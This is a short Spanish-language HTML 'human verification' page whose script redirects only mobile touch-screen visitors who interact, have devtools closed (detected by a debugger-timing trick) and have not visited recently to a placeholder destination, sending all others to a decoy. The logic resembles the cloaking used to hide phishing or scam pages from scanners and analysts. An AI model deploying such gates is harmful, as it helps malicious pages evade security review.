<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificación humana...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      background: #fff;
      margin: 0;
      padding: 0;
      height: 100vh;
    }
  </style>
</head>
<body>

<script>
(function () {
  const FINAL_REDIRECT = "https://tudestino-real.com";
  const FAKE_REDIRECT = "https://bloqueado.com";
  const WAIT_SECONDS = 3;
  const MIN_TIME_BETWEEN_ENTRIES = 300000; // 5 minutos en ms

  // Antibot simple - validaciones de interacción
  let humanScore = 0;
  let isHuman = false;
  let lastVisit = localStorage.getItem("last_human_visit");
  let now = Date.now();

  // Anti repetición rápida
  if (lastVisit && now - parseInt(lastVisit) < MIN_TIME_BETWEEN_ENTRIES) {
    window.location.href = FAKE_REDIRECT;
    return;
  }

  // Detección de interacción real (movimiento, clic, tiempo en página)
  function registerMouseMove() {
    humanScore += 1;
    document.removeEventListener("mousemove", registerMouseMove);
  }

  function registerClick() {
    humanScore += 1;
    document.removeEventListener("click", registerClick);
  }

  function isMobileDevice() {
    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
  }

  function detectDevTools() {
    let threshold = 160;
    let start = new Date();
    debugger;
    let end = new Date();
    return end - start > threshold;
  }

  function isRealDevice() {
    return isMobileDevice() && navigator.maxTouchPoints > 0;
  }

  // Eventos de interacción
  document.addEventListener("mousemove", registerMouseMove);
  document.addEventListener("click", registerClick);

  // Esperar unos segundos y verificar
  setTimeout(() => {
    // Lógica de verificación múltiple
    const touch = isRealDevice();
    const devtools = detectDevTools();
    const ipBlocked = false; // Requiere backend
    const geoBlocked = false; // Requiere backend

    if (touch && !devtools && !ipBlocked && !geoBlocked && humanScore >= 2) {
      isHuman = true;
    }

    if (isHuman) {
      localStorage.setItem("last_human_visit", Date.now());
      window.location.href = FINAL_REDIRECT;
    } else {
      window.location.href = FAKE_REDIRECT;
    }
  }, WAIT_SECONDS * 1000);
})();
</script>

</body>
</html>
